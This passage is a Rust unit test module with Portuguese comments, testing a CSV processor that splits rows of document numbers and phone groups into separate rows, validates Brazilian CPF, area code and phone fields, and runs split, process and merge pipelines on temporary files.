                {"in":1,"out":1,"ops":[]},
                {"in":2,"out":2,"ops":[]}
            ]"#,
        )
        .unwrap();

        process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            false,                   // escape_formulas off
            csv::QuoteStyle::Never,   // no quoting
            false,                   // emit_prefix_on_all_invalid
        )
        .unwrap();

        assert_eq!(
            output,
            b"doc;11;1111\ndoc;22;2222\n"
        );
    }

    // ===========================================================
    // emit_prefix_on_all_invalid (doc-keep fallback)
    // ===========================================================

    #[test]
    fn denormalize_emit_prefix_when_all_groups_invalid() {
        // doc válido + 1 grupo com DDD=0 (inválido) e phone válido.
        // Sem flag: grupo dropado, zero saídas.
        // Com flag: saída com doc preenchido e DDD/phone em branco.
        let input: &[u8] = b"33176825404;0;987148038\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":["digits_only"],"validate":"document"},
                {"in":1,"out":1,"ops":["digits_only"],"validate":"area_code"},
                {"in":2,"out":2,"ops":["digits_only"],"validate":"phone"}
            ]"#,
        )
        .unwrap();

        let (i, o, inv) = process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            false,
            csv::QuoteStyle::Never,
            true, // emit_prefix_on_all_invalid
        )
        .unwrap();

        assert_eq!((i, o, inv), (1, 1, 1));
        assert_eq!(std::str::from_utf8(&output).unwrap(), "33176825404;;\n");
    }

    #[test]
    fn denormalize_no_emit_when_flag_off_and_all_invalid() {
        // Comportamento default (flag off): grupos inválidos → nenhuma saída.
        let input: &[u8] = b"33176825404;0;987148038\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":["digits_only"],"validate":"document"},
                {"in":1,"out":1,"ops":["digits_only"],"validate":"area_code"},
                {"in":2,"out":2,"ops":["digits_only"],"validate":"phone"}
            ]"#,
        )
        .unwrap();

        let (i, o, inv) = process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            false,
            csv::QuoteStyle::Never,
            false, // flag OFF
        )
        .unwrap();

        assert_eq!((i, o, inv), (1, 0, 1));
        assert_eq!(output.len(), 0);
    }

    #[test]
    fn denormalize_prefix_alone_when_some_groups_valid() {
        // doc válido + 2 grupos: 1 válido, 1 inválido.
        // Com flag ativo: emite apenas o grupo válido, NÃO emite prefix-only
        // (o fallback só dispara se zero grupos passaram).
        let input: &[u8] = b"33176825404;82;987148038;0;987432606\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":["digits_only"],"validate":"document"},
                {"in":1,"out":1,"ops":["digits_only"],"validate":"area_code"},
                {"in":2,"out":2,"ops":["digits_only"],"validate":"phone"}
            ]"#,
        )
        .unwrap();

        let (i, o, inv) = process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            false,
            csv::QuoteStyle::Never,
            true,
        )
        .unwrap();

        assert_eq!((i, o, inv), (1, 1, 1));
        assert_eq!(
            std::str::from_utf8(&output).unwrap(),
            "33176825404;82;987148038\n"
        );
    }

    #[test]
    fn denormalize_drops_row_when_document_invalid_even_with_flag() {
        // Documento inválido → linha inteira dropada, sem fallback
        // mesmo com o flag ligado (prefixo não passa na validação).
        let input: &[u8] = b"00000000000;82;987148038\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":["digits_only"],"validate":"document"},
                {"in":1,"out":1,"ops":["digits_only"],"validate":"area_code"},
                {"in":2,"out":2,"ops":["digits_only"],"validate":"phone"}
            ]"#,
        )
        .unwrap();

        let (i, o, inv) = process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            false,
            csv::QuoteStyle::Never,
            true,
        )
        .unwrap();

        // Doc inválido: zero output, zero invalid (nem tentou grupos).
        assert_eq!((i, o, inv), (1, 0, 0));
        assert_eq!(output.len(), 0);
    }

    #[test]
    fn denormalize_emits_prefix_for_row_with_only_document() {
        // Linha só com o doc (1 coluna, zero grupos). Com flag ligado,
        // emite prefix-only.
        let input: &[u8] = b"33176825404\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":["digits_only"],"validate":"document"},
                {"in":1,"out":1,"ops":["digits_only"],"validate":"area_code"},
                {"in":2,"out":2,"ops":["digits_only"],"validate":"phone"}
            ]"#,
        )
        .unwrap();

        let (i, o, inv) = process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            false,
            csv::QuoteStyle::Never,
            true,
        )
        .unwrap();

        assert_eq!((i, o, inv), (1, 1, 0));
        assert_eq!(std::str::from_utf8(&output).unwrap(), "33176825404;;\n");
    }

    #[test]
    fn denormalize_emit_prefix_preserves_prefix_ops() {
        // Ops no prefixo (ex.: digits_only em "123.456.789-09") são aplicadas
        // tanto nas saídas regulares quanto no fallback prefix-only.
        let input: &[u8] = b"123.456.789-09;0;987148038\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":["digits_only"],"validate":"document"},
                {"in":1,"out":1,"ops":["digits_only"],"validate":"area_code"},
                {"in":2,"out":2,"ops":["digits_only"],"validate":"phone"}
            ]"#,
        )
        .unwrap();

        process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            false,
            csv::QuoteStyle::Never,
            true,
        )
        .unwrap();

        // Formatação removida pelo digits_only no prefixo do fallback
        assert_eq!(std::str::from_utf8(&output).unwrap(), "12345678909;;\n");
    }

    #[test]
    fn parallel_denormalize_user_scenario_keep_doc_on_invalid_ddd() {
        // Teste completo via process_parallel_denormalize_impl com o cenário
        // real do usuário: arquivo com mistura de linhas válidas e DDD=0.
        let dir = unique_temp_dir("pp_denorm_keep_doc");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(
            &input,
            "33176825404;82;987148038;82;987432606\n\
             34829718897;0;997979072\n\
             33176906315;85;987348663\n",
        );

        let fp = FileProcessor;
        let res = fp
            .process_parallel_denormalize_impl(
                path_str(&input),
                path_str(&output),
                2,
                ";",
                ";",
                false,
                1,
                2,
                r#"[
                    {"in":0,"out":0,"ops":["digits_only"],"validate":"document"},
                    {"in":1,"out":1,"ops":["digits_only"],"validate":"area_code"},
                    {"in":2,"out":2,"ops":["digits_only"],"validate":"phone"}
                ]"#,
                false,
                "never",
                true, // emit_prefix_on_all_invalid
            )
            .unwrap();

        // 3 inputs:
        //   linha 1: 2 grupos válidos → 2 outputs, 0 invalid
        //   linha 2: 1 grupo DDD=0 inválido → 0 outputs de grupo + 1 fallback = 1 output, 1 invalid
        //   linha 3: 1 grupo válido → 1 output, 0 invalid
        // Totais: in=3, out=4, invalid=1
        assert_eq!(res, vec![3, 4, 1]);

        let out = read_file(&output);
        let expected = "33176825404;82;987148038\n\
                        33176825404;82;987432606\n\
                        34829718897;;\n\
                        33176906315;85;987348663\n";
        assert_eq!(out, expected);
    }

    // ===========================================================
    // process_parallel_denormalize_impl (com arquivos reais)
    // ===========================================================

    #[test]
    fn parallel_denormalize_user_case_document_ddd_phone() {
        // Caso de uso real: document + múltiplos (ddd, phone) por linha.
        let dir = unique_temp_dir("pp_denorm_user");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(
            &input,
            "33176825404;82;987148038;82;987432606;82;987694281\n\
             33176841000;47;984192969;47;996592586\n\
             33176906315;74;999659384;75;998779719;85;987348663\n",
        );

        let fp = FileProcessor;
        let res = fp
            .process_parallel_denormalize_impl(
                path_str(&input),
                path_str(&output),
                4,
                ";",
                ";",
                false,
                1,
                2,
                r#"[
                    {"in":0,"out":0,"ops":["digits_only"],"validate":"document"},
                    {"in":1,"out":1,"ops":["digits_only"],"validate":"area_code"},
                    {"in":2,"out":2,"ops":["digits_only"],"validate":"phone"}
                ]"#,
                false,
                "never",
                false,
            )
            .unwrap();

        // 3 inputs → 3+2+3 = 8 grupos, todos válidos
        assert_eq!(res, vec![3, 8, 0]);

        // Ordem preservada (buffer-merge sequencial)
        let out = read_file(&output);
        let expected = "33176825404;82;987148038\n\
                        33176825404;82;987432606\n\
                        33176825404;82;987694281\n\
                        33176841000;47;984192969\n\
                        33176841000;47;996592586\n\
                        33176906315;74;999659384\n\
                        33176906315;75;998779719\n\
                        33176906315;85;987348663\n";
        assert_eq!(out, expected);
    }

    #[test]
    fn parallel_denormalize_parity_with_manual_flattening() {
        // Processar o arquivo desnormalizado diretamente vs. achatar manualmente
        // e processar com processParallel deve dar output IDÊNTICO.
        let dir_denorm = unique_temp_dir("parity_denorm");
        let dir_flat = unique_temp_dir("parity_flat");

        let input_denorm = dir_denorm.join("in.csv");
        let input_flat = dir_flat.join("in.csv");
        let out_denorm = dir_denorm.join("out.csv");
        let out_flat = dir_flat.join("out.csv");

        write_file(
            &input_denorm,
            "aaa;11;1111;22;2222\n\
             bbb;33;3333\n",
        );
        // Achatado manualmente
        write_file(
            &input_flat,
            "aaa;11;1111\n\
             aaa;22;2222\n\
             bbb;33;3333\n",
        );

        let layout = r#"[
            {"in":0,"out":0,"ops":[]},
            {"in":1,"out":1,"ops":[]},
            {"in":2,"out":2,"ops":[]}
        ]"#;

        let fp = FileProcessor;
        let denorm_totals = fp
            .process_parallel_denormalize_impl(
                path_str(&input_denorm),
                path_str(&out_denorm),
                2,
                ";",
                ";",
                false,
                1,
                2,
                layout,
                false,
                "never",
                false,
            )
            .unwrap();
        let flat_totals = fp
            .process_parallel_impl(
                path_str(&input_flat),
                path_str(&out_flat),
                2,
                ";",
                ";",
                false,
                layout,
                false,
                "never",
            )
            .unwrap();

        // output_count deve bater (são as saídas escritas)
        assert_eq!(denorm_totals[1], flat_totals[1]);
        // conteúdo dos arquivos deve ser byte-idêntico
        assert_eq!(read_file(&out_denorm), read_file(&out_flat));
    }

    #[test]
    fn parallel_denormalize_drops_invalid_groups_preserves_valid() {
        // Mistura de grupos válidos e inválidos no MESMO input
        let dir = unique_temp_dir("pp_denorm_validity");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        // doc válido, 3 grupos: válido, inválido (DDD 10), válido
        write_file(
            &input,
            "33176825404;11;987148038;10;999999999;12;987432606\n",
        );

        let fp = FileProcessor;
        let res = fp
            .process_parallel_denormalize_impl(
                path_str(&input),
                path_str(&output),
                1,
                ";",
                ";",
                false,
                1,
                2,
                r#"[
                    {"in":0,"out":0,"ops":["digits_only"],"validate":"document"},
                    {"in":1,"out":1,"ops":["digits_only"],"validate":"area_code"},
                    {"in":2,"out":2,"ops":["digits_only"],"validate":"phone"}
                ]"#,
                false,
                "never",
                false,
            )
            .unwrap();

        assert_eq!(res, vec![1, 2, 1]);
        let out = read_file(&output);
        assert!(out.contains("987148038"));
        assert!(out.contains("987432606"));
        assert!(!out.contains("999999999"));
    }

    #[test]
    fn parallel_denormalize_rejects_out_of_range_input_index_early() {
        // Erro de bounds vem antes de abrir o arquivo
        let dir = unique_temp_dir("pp_denorm_bad_layout");
        let input = dir.join("in.csv");
        write_file(&input, "a;b;c\n");

        let fp = FileProcessor;
        let err = fp
            .process_parallel_denormalize_impl(
                path_str(&input),
                path_str(&dir.join("out.csv")),
                1,
                ";",
                ";",
                false,
                1,
                2,
                r#"[{"in":5,"out":0,"ops":[]}]"#, // virtual width = 3, in:5 é inválido
                false,
                "never",
                false,
            )
            .unwrap_err();
        assert!(err.contains("exceeds virtual row width"));
    }

    // ===========================================================
    // Pipeline completo
    // ===========================================================

    #[test]
    fn full_pipeline_split_process_merge_without_header() {
        let dir = unique_temp_dir("pipeline_noheader");
        let input = dir.join("input.csv");
        let final_out = dir.join("final.csv");
        write_file(
            &input,
            "12345678909;Alice\n11111111111;Bob\n12345678909;Carol\n",
        );

        let fp = FileProcessor;
        fp.split_file_impl(path_str(&input), path_str(&dir), 2)
            .unwrap();

        let res = fp
            .process_chunks_impl(
                path_str(&dir),
                2,
                ";",
                ";",
                false,
                r#"[
                    {"in":0,"out":0,"ops":[],"validate":"cpf"},
                    {"in":1,"out":1,"ops":["uppercase"]}
                ]"#,
                true,
                "necessary",
            )
            .unwrap();

        assert_eq!(res, vec![3, 2, 1]);

        let total = fp
            .merge_files_impl(path_str(&dir), path_str(&final_out), 2)
            .unwrap();
        assert_eq!(total, 2);

        let final_content = read_file(&final_out);
        assert!(final_content.contains("ALICE"));
        assert!(final_content.contains("CAROL"));
        assert!(!final_content.contains("Bob"));
    }

    #[test]
    fn full_pipeline_skip_header_only_drops_from_first_chunk() {
        let dir = unique_temp_dir("pipeline_skip_header");
        let input = dir.join("input.csv");
        write_file(
            &input,
            "header1;header2\n12345678909;Alice\n11111111111;Bob\n12345678909;Carol\n",
        );

        let fp = FileProcessor;
        fp.split_file_impl(path_str(&input), path_str(&dir), 2)
            .unwrap();

        let res = fp
            .process_chunks_impl(
                path_str(&dir),
                2,
                ";",
                ";",
                true,
                r#"[{"in":0,"out":0,"ops":[],"validate":"cpf"}]"#,
                true,
                "necessary",
            )
            .unwrap();

        // chunk 0: header + Alice + Bob (skip_header descarta header)
        //   -> Alice válida, Bob inválido -> output 1
        // chunk 1: Carol (skip_header NÃO se aplica a chunks > 0)
        //   -> Carol válida -> output 1
        assert_eq!(res, vec![3, 2, 1]);
    }
}
